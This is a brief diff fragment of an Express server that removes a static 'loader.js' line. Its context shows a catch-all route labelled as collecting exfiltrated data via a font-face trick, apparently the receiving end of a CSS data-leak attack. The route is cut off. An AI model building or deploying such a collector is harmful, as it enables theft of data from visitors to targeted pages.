@@ -14,7 +14,6 @@ if (!fs.existsSync(DATA_FOLDER)) {
 
 console.log(`🚀 Server starting on port ${PORT}`);
 
-app.use(express.static(path.join(__dirname, 'loader.js')));
 // Catch-all route for data exfiltration (font-face trick)
 app.get('*', (req, res) => {
     const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
